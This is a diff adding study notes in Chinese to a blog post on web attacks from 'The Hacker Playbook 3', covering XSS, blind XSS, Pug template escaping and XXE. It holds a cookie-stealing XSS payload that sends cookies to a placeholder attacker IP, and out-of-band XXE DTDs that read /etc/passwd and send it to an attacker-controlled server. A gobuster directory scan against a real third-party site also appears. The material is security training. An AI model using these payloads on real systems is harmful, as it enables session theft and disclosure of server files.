@@ -278,7 +278,140 @@
 <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">root@thp3:/opt/gobuster<span class="comment"># ./gobuster -u http://www.baidu.com -w /opt/SecLists/Discovery/Web-Content/raft-small-directories.txt -s 200,307 -t 20</span></span><br><span class="line"></span><br><span class="line">Gobuster v1.4.1              OJ Reeves (@TheColonial)</span><br><span class="line">=====================================================</span><br><span class="line">=====================================================</span><br><span class="line">[+] Mode         : dir</span><br><span class="line">[+] Url/Domain   : http://www.baidu.com/</span><br><span class="line">[+] Threads      : 20</span><br><span class="line">[+] Wordlist     : /opt/SecLists/Discovery/Web-Content/raft-small-directories.txt</span><br><span class="line">[+] Status codes : 200,307</span><br><span class="line">=====================================================</span><br><span class="line">/home (Status: 200)</span><br><span class="line">/s (Status: 200)</span><br><span class="line">=====================================================</span><br></pre></td></tr></table></figure>
 <p>你的字典列表非常重要。我最喜欢使用的一个汇总的字典列表是一个名为raft的旧字典，它是许多开源项目的集合。你可以在这里找到这些和其他有价值的字典列表：<a href="https://github.com/danielmiessler/SecLists/tree/master/Discovery/Web-Content" target="_blank" rel="noopener">https://github.com/danielmiessler/SecLists/tree/master/Discovery/Web-Content</a> (已包含在本书的Kali镜像中)。</p>
 <p>现在既然我们已经完成了概述，让我们进行一些攻击吧。从红队的角度来看，我们正在寻找可以主动攻击的漏洞，并为我们提供最大的帮助。如果我们正在进行评估或渗透测试，我们可能会报告漏洞扫描程序中的 SSL 问题，默认Apache 页面或其他漏洞扫描程序发现的不可利用的漏洞等。但是，在我们的红队工作中，我们可以完全忽略这些，并专注于能使我们获得高级访问权限，shell 或 转储 PII 的攻击。</p>
-<h2 id="XSS跨站脚本攻击"><a href="#XSS跨站脚本攻击" class="headerlink" title="XSS跨站脚本攻击"></a>XSS跨站脚本攻击</h2>
+<h2 id="XSS跨站脚本攻击"><a href="#XSS跨站脚本攻击" class="headerlink" title="XSS跨站脚本攻击"></a>XSS跨站脚本攻击</h2><p>我们都知道XSS攻击时客户端攻击，允许攻击者创建特定的Web请求从而将恶意代码注入响应中。这通常可以通过客户机和服务器端的适当输入验证来修复，但这绝不是那么容易。为什么这么说？因为XSS漏洞由多种原因造成的。从编码不规范到不理解框架，有时候应用程序变得过于复杂，旧很难理解一个输入点的安全性。</p>
+<p>因为仅仅弹窗确实没有真正的危害，让我们从一些基本类型的XSS攻击开始：</p>
+<ul>
+<li><p>Cookie窃取XSS:</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="built_in">document</span>.write(<span class="string">'&lt;img src="http//&lt;YourIP&gt;/Stealer.php?cookie='</span>%<span class="number">2</span>B <span class="built_in">document</span>.cookie %<span class="number">2</span>B<span class="string">'"/&gt;'</span>);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>强制下载文件：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="keyword">var</span> link = <span class="built_in">document</span>.createElement(<span class="string">'a'</span>); link.href=<span class="string">'http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe'</span>; link.download =<span class="string">''</span>;<span class="built_in">document</span>.body.appendChild(link); link.click();&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>重定向用户：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="built_in">window</span>.location = <span class="string">"https://www.youtube.com/watch?v=dQw4w9WgXcQ"</span>;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>其他脚本以启用键盘记录器，拍照等：</p>
+<ul>
+<li><a href="http://www.xss-payloads.com/payloads-list.html?c#category=capture" target="_blank" rel="noopener">http://www.xss-payloads.com/payloads-list.html?c#category=capture</a></li>
+</ul>
+</li>
+</ul>
+<h3 id="经过混淆的XSS-payload和XSS-Polyglot"><a href="#经过混淆的XSS-payload和XSS-Polyglot" class="headerlink" title="经过混淆的XSS payload和XSS Polyglot"></a>经过混淆的XSS payload和XSS Polyglot</h3><p>我们会遇到一些应用程序过滤字符或应用程序有WAF防护的情况。有两个很好的资源可以帮助你开始制作混淆的XSS payload攻击：</p>
+<ul>
+<li><a href="https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet" target="_blank" rel="noopener">https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet</a>  </li>
+<li><a href="https://github.com/foospidy/payloads/tree/master/other/xss" target="_blank" rel="noopener">https://github.com/foospidy/payloads/tree/master/other/xss</a></li>
+</ul>
+<p>一些不需要使用<code>&lt;script&gt;</code>标签的payload：</p>
+<ul>
+<li><code>&lt;b onmouseover=alert(&#39;XSS&#39;)&gt;Click Me!&lt;/b&gt;</code></li>
+<li><code>&lt;svg onload=alert(1)&gt;</code></li>
+<li><code>&lt;body onload=&quot;alert(&#39;XSS&#39;)&quot;&gt;</code></li>
+</ul>
+<p><strong>XSS的其他优秀资源：</strong></p>
+<ul>
+<li><p>第一个是由@jackmasa制作的思维导图。这是一个很棒的文档，它根据输入点的位置来分解不同的XSS payload。最然不再在jackMasa GitHub页面上，<a href="https://raw.githubusercontent.com/cyberspacekittens/XSS/master/XSS2.png" target="_blank" rel="noopener">这里提供一个副本</a></p>
+</li>
+<li><p>另一个很好的资源，讨论哪些浏览器容易受到哪些XSS payload的影响：<a href="https://html5sec.org/" target="_blank" rel="noopener">https://html5sec.org/</a></p>
+</li>
+<li><p>最后一种类型的payload称为<a href="https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot" target="_blank" rel="noopener">Polyglot</a>,Polyglot payload采用许多不同类型的payload和混淆技术，并将它们编译成一次攻击。这适用于想使用自动脚本查找XSS、时间有限的漏洞赏金项目，或者仅仅想要快速发现输入验证存在哪些问题等情况。</p>
+</li>
+</ul>
+<h2 id="Blind-XSS漏洞"><a href="#Blind-XSS漏洞" class="headerlink" title="Blind XSS漏洞"></a>Blind XSS漏洞</h2><p>攻击者/用户看不到存储的XSS payload的执行（无回显），只有管理员或后台员工才能看到。由于其攻击后端用户的能力，所以这种攻击可能危害很大，但尽管如此，它还是经常被遗忘。</p>
+<p>例如，我们假设某个应用程序有一个“联系我们”页面，允许用户向管理员提供联系信息，以便以后联系。由于该数据的结果只能由管理员手动查看而不是用户请求查看，所以如果应用程序易受XSS攻击，攻击者不会立即看到他们的”alert(1)”攻击的回显。在这些情况下，我们可以使用<a href="https://xsshunter.com/" target="_blank" rel="noopener">XSSHunter</a>来帮助我们验证Blind XSS漏洞。</p>
+<p>XSSHunter的工作原理是，当我们的JavaScript payload执行时，它将截取受害者屏幕（他们正在查看的当前页面）的屏幕截图，并将该数据发送回XSSHunter的站点。发生这种情况时，XSSHunter将发送一个警报，告知我们的payload已执行并向我们提供所有详细信息。我们现在可以回去创建一个恶意payload并重新进行我们的攻击。</p>
+<p>XSS Hunter：</p>
+<pre><code>- 禁用任何代理（即Burp Suite）
+- 在[https://xsshunter.com/](https://xsshunter.com/)创建账户
+- 登录[https://xsshunter.com/app](https://xsshunter.com/app)
+- 转到 Payload 模块以获得你的 Payload
+- 修改 Payload 以适应你的攻击或使用它构建 Polyglot
+- 检查 XSS Hunter 以查看 payload 执行情况
+</code></pre><h2 id="NodeJS-中的高级-XSS"><a href="#NodeJS-中的高级-XSS" class="headerlink" title="NodeJS 中的高级 XSS"></a>NodeJS 中的高级 XSS</h2><p>在高级 XSS 部分中，你将学习一些特定语言的 XSS 漏洞发挥作用的示例。我们的 NodeJS Web 应用程序将使用一种更常见的 Web 堆栈和配置。此实现包括 <a href="https://expressjs.com/" target="_blank" rel="noopener">Express Framework</a> 和<a href="https://pugjs.org/api/getting-started.html" target="_blank" rel="noopener">Pug 模板引擎</a>。重要的是要注意一点，默认情况下，Express确实没有内置的 XSS 防护，除非通过模板引擎进行渲染。当使用像 Pub 这样的模板引擎时，有两种常见的方法可以找到 XSS 漏洞：（1）通过字符串插值，（2）缓冲代码。</p>
+<p>模板引擎有一个字符串插值的概念，这是一种定义“字符串变量的占位符”的奇特方式。例如，让我们将字符串分配给 Pug 模板格式的变量：<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">- <span class="keyword">var</span> title = <span class="string">"This is the HTML Title"</span></span><br><span class="line">- <span class="keyword">var</span> THP = <span class="string">"Hack the Planet"</span></span><br><span class="line">h1 #&#123;title&#125;</span><br><span class="line">p The Hacker Playbook will teach you how to #&#123;THP&#125;</span><br></pre></td></tr></table></figure></p>
+<p>请注意， #{THP} 是 THP 之前分配的变量的占位符。我们通常会在电子邮件分发消息中看到这些模板。你是否收到<br>过来自 ${first_name} …的自动化系统发送的电子邮件而不是你的真实名字？这正是模板引擎的用途。<br>当上面的模板代码呈现为 HTML 时，它将如下所示:<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>This is the HTML Title<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>The Hacker Playbook will teach you how to Hack the Planet<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>幸运的是，在这种情况下，我们使用 #{} 字符串插值，这是 Pug 插值的转义版本。如你所见，通过使用模板，我们可以创建可重用性非常高的代码并使模板非常轻量级。</p>
+<p>Pug 支持转义和非转义字符串插值。隐藏和未转义之间的区别是什么？好吧，使用转义字符串插值将对 &lt; ， &gt; ， ‘和 “ 之类的字符进行 HTML 编码。这将有助于向用户提供输入验证。如果开发人员使用非转义字符串插值，这通常会导致 XSS 漏洞。</p>
+<p>此外，字符串插值（或变量插值，变量替换或变量扩展）是评估包含一个或多个占位符的字符串文字的过程，从而产生一个结果，其中占位符替换为其对应的值。<a href="https://en.wikipedia.org/wiki/String_interpolation" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/String_interpolation</a></p>
+<ul>
+<li><p>在 Pug 隐藏和非转义字符串插值<a href="https://pugjs.org/language/interpolation.html" target="_blank" rel="noopener">https://pugjs.org/language/interpolation.html</a></p>
+<ul>
+<li>!{}-非转义字符串插值</li>
+<li>#{}-转义字符串插值*虽然这是转义的,但如果直接通过 JavaScript 传递它仍然可能容易受到 XSS 的攻击</li>
+</ul>
+</li>
+<li><p>在 JavaScript 中，未转义的缓冲区代码以“!=”开头。“!=”之后的任何内容都将自动作为 JavaScript 执行。<a href="https://pugjs.org/language/code.html#unescaped-buffered-code" target="_blank" rel="noopener">https://pugjs.org/language/code.html#unescaped-buffered-code</a></p>
+</li>
+<li><p>最后，只要允许插入原始 HTML ，就有可能存在 XSS 。</p>
+</li>
+</ul>
+<p>在复杂的应用程序上触发 XSS 并不容易。很容易忽视或误解框架如何处理输入和输出。因此，在为 Pug/NodeJS 应用程序执行源代码审查时，在源代码中搜索 !{ ， #{ 或 ${ 有助于可能触发 XSS 的位置。了解上下文，以及是否需要在该上下文中进行转义，这是至关重要的，我们将在以下示例中看到。尽管这些攻击特定于 Node 和 Pug，但每种语言都存在针对 XSS 和输入验证的问题。你将无法运行漏洞扫描程序或XSS 模糊测试工具并找到所有 XSS 漏洞。但你确实需要了解所使用的语言和框架。</p>
+<h2 id="从-XSS-到-SHELL"><a href="#从-XSS-到-SHELL" class="headerlink" title="从 XSS 到 SHELL"></a>从 XSS 到 SHELL</h2><p>我经常遇到的一个问题是，我如何通过 XSS 获取 Shell？尽管有许多不同的方法可以做到这一点，但我们通常会发现，如果我们可以让用户在内容管理系统（CMS）或类似系统中获得管理员的 XSS，那么这可能会导致系统完全受损。可以在这里找到 Hans-Michael 完整的演练示例和代码：<a href="https://github.com/Varbaek/xsser" target="_blank" rel="noopener">https://github.com/Varbaek/xsser</a> 。 Hans-Michael提供了一些关于重建 XSS 到 RCE 攻击的精彩示例和视频。<br>自己实践：<br>    开始以为所有的xss都可以用，后来发现只适合部分cms的部分版本。没有找到响应的版本，也就没试。只把工具下载下来了。</p>
+<p>我喜欢使用涉及利用 JavaScript 功能的自定义红队攻击。我们知道 JavaScript 非常强大，我们在 BeEF（浏览器开发框架）中看到过这样的功能。因此，我们可以利用所有这些功能来执行受害者不知情的攻击。这个 payload 会做些什么？攻击的一个示例是让受害者计算机上运行的 JavaScript XSS payload 获取受害者的内部（自然）IP 地址。然后，我们可以获取其 IP 地址并开始使用我们的 payload 扫描其内部网络。如果我们发现一个允许在没有身份验证的情况下就可以登入的 Web 应用程序，我们就可以向该服务器发送 payload。</p>
+<h2 id="反序列化攻击"><a href="#反序列化攻击" class="headerlink" title="反序列化攻击"></a>反序列化攻击</h2><p>序列化数据有很多原因，但最常用于生成值/数据的可存储表示而不会丢失其类型或结构。序列化将对象转换为字节流，以通过网络传输或存储。通常，转换方法涉及 XML，JSON 或特定于该语言的序列化方法。</p>
+<p><strong>书中的举例是Nodejs语言的反序列化漏洞，不想深入了解，后续补充其他语言的反序列化漏洞实例。</strong></p>
+<h2 id="模板引擎攻击–模板注入"><a href="#模板引擎攻击–模板注入" class="headerlink" title="模板引擎攻击–模板注入"></a>模板引擎攻击–模板注入</h2><p><strong>这个又是Nodejs，不写了。</strong></p>
+<h2 id="JavaScript-和远程代码执行"><a href="#JavaScript-和远程代码执行" class="headerlink" title="JavaScript 和远程代码执行"></a>JavaScript 和远程代码执行</h2><p>远程代码执行是我们在每次入侵和 Web 应用程序渗透测试中必须寻找的。虽然 RCE 几乎可能在任何地方找到，但它们最常见于允许上传的地方，例如：上传 web shell，一个像 Imagetragick 这样的漏洞利用，使用 Office 文件进行XXE 攻击，基于遍历的目录上传以替换关键文件等。</p>
+<p>传统来说，我们可能会尝试找到我们可以使用的上传区域和 shell。可以在此处找到不同类型的 webshell payload 的绝佳列表：<a href="https://github.com/tennc/webshell" target="_blank" rel="noopener">https://github.com/tennc/webshell</a> 。请注意，我绝不会审查任何这些 shell 是否存在后门，所以使用它们需要你自担风险。我遇到过很多有后门的 shell。</p>
+<h2 id="服务器端请求伪造（SSRF）"><a href="#服务器端请求伪造（SSRF）" class="headerlink" title="服务器端请求伪造（SSRF）"></a>服务器端请求伪造（SSRF）</h2><p>其他资源：</p>
+<ul>
+<li><p>本地的很多编码：</p>
+<ul>
+<li><a href="http://www.agarri.fr/docs/AppSecEU15-Server_side_browsing_considered_harmful.pdf" target="_blank" rel="noopener">http://www.agarri.fr/docs/AppSecEU15-Server_side_browsing_considered_harmful.pdf</a></li>
+</ul>
+</li>
+<li><p>Bug Bounty - AirBNB</p>
+<ul>
+<li><a href="https://buer.haus/2017/03/09/airbnb-chaining-third-party-open-redirect-into-server-side-request-forgery-ssrf-via-liveperson-chat/" target="_blank" rel="noopener">示例</a></li>
+</ul>
+</li>
+</ul>
+<h2 id="XML-外部实体攻击（XXE）"><a href="#XML-外部实体攻击（XXE）" class="headerlink" title="XML 外部实体攻击（XXE）"></a>XML 外部实体攻击（XXE）</h2><p>XML 代表可扩展标记语言，旨在发送/存储易于阅读的数据。 XML eXternal Entities（XXE）是对应用程序中 XML 解析器的攻击。XML 解析常见于允许文件上传，解析 Office 文档，JSON 数据甚至 Flash 类型游戏的应用程序中。当允许 XML 解析时，不正确的验证可以授予攻击者读取文件的权限、导致拒绝服务攻击，甚至远程代码执行。从一个比较高的维度来看，应用程序具有以下需求：</p>
+<pre><code>- 1) 解析用户提供的 XML 数据，
+- 2) 实体的系统标识符部分必须在文档类型声明(DTD)内，
+- 3) XML处理器必须验证/处理 DTD 并解析外部实体。
+</code></pre><p>XXE实验：</p>
+<p>一个 VMWare虚拟机用于 XXE 攻击</p>
+<pre><code>- [http://dl1.thehackerplaybook.com/THP-xxe-vm.zip](http://dl1.thehackerplaybook.com/THP-xxe-vm.zip)
+</code></pre><p>下载后，在 VMWare 中打开虚拟机并启动它。在登录屏幕上，你无需登录，但你应该看到系统的 IP 地址。<br>转到浏览器：</p>
+<pre><code>- 通过 Burp Suite 代理所有流量
+- 转到 URL：http://[IP of your Virtual Machine]
+- 拦截流量并点击 Hack the XML
+</code></pre><p>如果在加载页面后查看页面的 HTML 源代码，你可以看到有一个通过 POST 请求提交的隐藏字段。XML 内容如下所示：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version =<span class="string">"1.0"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE thp [</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT thp ANY&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY book "Universe"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">thp</span>&gt;</span> Hack The &amp;book;<span class="tag">&lt;/<span class="name">thp</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>在这个例子中，我们指定它是 XML 1.0版本，DOCTYPE，指定根元素是 thp， !ELEMENT 指定任何类型，并且!ENTITY 将 book变量设置为“Universe”字符串。最后，在我们的 XML 输出中，我们希望从解析 XML 文件中打印出我们的实体。这通常是你在发送 XML 数据的应用程序中看到的内容。由于我们控制具有 XML 请求的 POST 数据，因此我们可以尝试注入我们自己的恶意实体。默认情况下，大多数 XML 解析库都支持 SYSTEM 关键字，该关键字允许从 URI 读取数据(包括使用 file:// 协议 )。因此，我们可以创建自己的实体来制作在 /etc/passwd 上读取的文件。<br>恶意payload：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE thp[</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT thp ANY&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY book SYSTEM "file:///etc/passwd"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">thp</span>&gt;</span>Hack The &amp;book;<span class="tag">&lt;/<span class="name">thp</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p><img src="https://bj.bcebos.com/v1/image-langke/hexo-neirongpeitu/黑客秘籍3/xxe_passwd.png" alt="https://bj.bcebos.com/v1/image-langke/hexo-neirongpeitu/黑客秘籍3/xxe_passwd.png"></p>
+<h2 id="高级-XXE-–-XXE-OOB"><a href="#高级-XXE-–-XXE-OOB" class="headerlink" title="高级 XXE – XXE-OOB"></a>高级 XXE – XXE-OOB</h2><p>在之前的攻击中，我们能够在 <thp> 标签中获得返回的响应。那么如果我们看不到响应或遇到字符或文件限制怎么办？我们怎样使用带外数据协议（OOB）来发送我们的数据？我们可以提供远程文档类型定义（DTD）文件来执行OOB-XXE，而不是在请求 payload 中定义我们的攻击。DTD 是结构良好的 XML 文件，用于定义 XML 文档的结构和法律元素及属性。为了简单起见，我们的 DTD 将包含我们所有的攻击或 exfil payload，这将帮助我们解决许多字符的限制。</thp></p>
+<p>新的 XXE 攻击将分四个阶段进行：</p>
+<ol>
+<li>使用篡改后的 XXE XML 攻击</li>
+<li>对于存在漏洞的 XML 解析器，它会从攻击者服务器抓取一个 DTD 文件</li>
+<li>该 DTD 文件包含读取 /etc/passwd 文件的代码</li>
+<li>该 DTD文件也包含用于隐秘传输 /etc/passwd 内容的代码（可能是经过编码的）</li>
+</ol>
+<ul>
+<li><p>我们需要通过创建名为 payload.dtd 的文件在攻击者服务器上托管此payload</p>
+<ul>
+<li>vim /var/www/html/payload.dtd<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> % <span class="attr">file</span> <span class="attr">SYSTEM</span> "<span class="attr">file:</span>///<span class="attr">etc</span>/<span class="attr">passwd</span>"&gt;</span></span><br><span class="line">&lt;!ENTITY % all "&lt;!ENTITY send SYSTEM 'http://[VPS-IP]:8888/collect=%file;'&gt;"&gt;</span><br><span class="line">%all;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+<li><p>在进行 XXE 攻击时，通常会遇到解析器错误。很多时候，XXE解析器仅仅允许某些字符，因此读取带有特殊字符的文件会报错。我们可以做些什么来解决这个问题？在使用PHP 的情况下，我们可以使用 PHP 输入和输出流（ 参考：<a href="http://php.net/manual/en/wrappers.php.php" target="_blank" rel="noopener">http://php.net/manual/en/wrappers.php.php</a> ）来读取本地文件，并使用 php://filter/read=convert.base64-encode 对它们进行 base64 编码。更改paylaod.dtd文件使用此功能：</p>
+<ul>
+<li>vim /var/www/html/payload.dtd<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> % <span class="attr">file</span> <span class="attr">SYSTEM</span> "<span class="attr">php:</span>//<span class="attr">filter</span>/<span class="attr">read</span>=<span class="string">convert.base64-encode/resouce</span>=<span class="string">file:///etc/passwd</span>"&gt;</span></span><br><span class="line">&lt;!ENTITY % all "&lt;!ENTITY send SYSTEM 'http://[Your_IP]:8888/collect=%file;'&gt;"&gt;</span><br><span class="line">%all;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+<li><p>用NetCat监听8888端口</p>
+<ul>
+<li>nc -l -p 8888</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://bj.bcebos.com/v1/image-langke/hexo-neirongpeitu/黑客秘籍3/xxe_passwd.png" alt="https://bj.bcebos.com/v1/image-langke/hexo-neirongpeitu/黑客秘籍3/xxe_passwd.png"></p>
+<p>更多 XXE payload：</p>
+<pre><code>- [https://gist.github.com/staaldraad/01415b990939494879b4](https://gist.github.com/staaldraad/01415b990939494879b4)
+- [https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/XXE-Fuzzing.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/XXE-Fuzzing.txt)    
+</code></pre><h1 id="本章总结"><a href="#本章总结" class="headerlink" title="本章总结"></a>本章总结</h1><p>虽然这只是你可能遇到的所有不同网络攻击的一小部分，但我希望这些案例能打开你的视野，关于更现代的框架（Node.js）是如何引入旧的和新的攻击。许多常见的应用程序漏洞扫描器往往会错过很多这些更复杂的漏洞，因为它们是基于特定的语言或框架的。我想提出的要点是，为了进行充分的攻击活动，你需要真正理解语言和框架。</p>
+
     </div>
 
     
